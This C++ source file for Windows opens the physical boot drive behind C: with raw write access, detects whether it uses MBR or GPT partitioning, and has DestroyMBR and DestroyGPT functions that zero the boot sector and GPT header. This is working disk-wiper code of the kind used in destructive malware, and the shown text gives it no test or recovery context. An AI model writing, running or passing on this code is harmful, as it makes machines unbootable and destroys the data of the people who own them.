#include "boot.h"

#include <iostream>

#include "util.h"

static HANDLE hBootDrive = INVALID_HANDLE_VALUE;

bool GetLBASectorSize(DWORD& sectorSize)
{
	DWORD bytesReturned;
	DISK_GEOMETRY_EX diskGeometry;

	if (!DeviceIoControl(hBootDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &diskGeometry,
		sizeof diskGeometry, &bytesReturned, nullptr))
	{
		std::wcout << L"Failed to retrieve drive geometry. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	sectorSize = diskGeometry.Geometry.BytesPerSector;

	return true;
}

bool OpenBootDrive()
{
	std::wstring bootDrive;
	if (!GetPhysicalDriveFromDriveLetter(L"\\\\.\\C:", bootDrive))
	{
		return false;
	}

	// Open the boot drive
	hBootDrive = CreateFileW(bootDrive.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, nullptr);
	if (hBootDrive == INVALID_HANDLE_VALUE)
	{
		std::wcout << L"Failed to open the boot drive. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	return true;
}

bool CloseBootDrive()
{
	if (!CloseHandle(hBootDrive))
	{
		std::wcout << L"Failed to close the boot drive. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	return true;
}


bool GetBootDriveType(PartitionStyle& style)
{
	// Get the partition style of the boot drive
	DWORD bytesReturned = 0;
	PARTITION_INFORMATION_EX partitionInfo;
	if (!DeviceIoControl(hBootDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, nullptr, 0, &partitionInfo,
		sizeof partitionInfo, &bytesReturned, nullptr))
	{
		std::wcout << L"Failed to retrieve the partition style. Error: " << FormatErrorMessage() << std::endl;
		CloseHandle(hBootDrive);
		return false;
	}

	// Check if the partition style indicates GPT
	const bool isGPT = partitionInfo.PartitionStyle == PARTITION_STYLE_GPT;

	style = isGPT ? PartitionStyle::Gpt : PartitionStyle::Mbr;
	return true;
}

bool DestroyMBR()
{
	constexpr unsigned char buffer[512] = { 0 };

	DWORD bytesWritten = 0;
	if (!(WriteFile(hBootDrive, buffer, 512, &bytesWritten, nullptr) && bytesWritten == 512))
	{
		std::wcout << L"Failed to write to boot sector. Error: " << FormatErrorMessage() << std::endl;
		return false;
	}

	return true;
}

bool DestroyGPT()
{
	DWORD sectorSize;
	if (!GetLBASectorSize(sectorSize))
	{
		return false;
	}

	const auto buffer = new unsigned char[sectorSize * 2] {0};

	DWORD bytesWritten = 0;
	if (!(WriteFile(hBootDrive, buffer, sectorSize * 2, &bytesWritten, nullptr) && bytesWritten == sectorSize * 2))
	{
		std::wcout << L"Failed to write to GPT header. Error: " << FormatErrorMessage() << std::endl;
		delete[] buffer;
		return false;
	}

	delete[] buffer;
	return true;
}